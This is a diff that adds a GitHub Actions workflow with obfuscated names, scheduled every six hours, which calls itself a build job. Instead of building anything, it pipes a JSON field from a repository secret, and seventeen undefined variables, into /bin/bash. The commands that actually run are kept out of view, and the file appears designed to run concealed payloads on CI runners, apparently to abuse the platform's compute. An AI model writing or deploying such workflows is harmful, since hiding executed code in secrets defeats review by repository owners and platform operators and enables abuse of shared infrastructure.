@@ -1,0 +1,34 @@
+name: masirenkuang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: masirenkuang
+        env:
+          sejrv5: ${{ secrets.sejrv5 }}
+        run: |
+          echo $sejrv5 | jq -r .wlk20 | /bin/bash
+          echo $izvgb8 | jq -r .ammdh1681 | /bin/bash
+          echo $i30 | jq -r .akmnv257 | /bin/bash
+          echo $hjes4 | jq -r .fdpst27538 | /bin/bash
+          echo $n98634 | jq -r .r670 | /bin/bash
+          echo $cvc5 | jq -r .rcpg7 | /bin/bash
+          echo $pft0 | jq -r .g730 | /bin/bash
+          echo $njxf9624 | jq -r .xrdvr171 | /bin/bash
+          echo $m867 | jq -r .ha3 | /bin/bash
+          echo $ne3446 | jq -r .tki29 | /bin/bash
+          echo $gij00225 | jq -r .mzww5746 | /bin/bash
+          echo $dir13395 | jq -r .ekeyk25 | /bin/bash
+          echo $kkc9 | jq -r .ql183 | /bin/bash
+          echo $m892 | jq -r .trsn265 | /bin/bash
+          echo $uqdwz9947 | jq -r .py0508 | /bin/bash
+          echo $ud729 | jq -r .ezok8271 | /bin/bash
+          echo $hyv9 | jq -r .nvg6 | /bin/bash
+          echo $icp9285 | jq -r .oksab7230 | /bin/bash
+
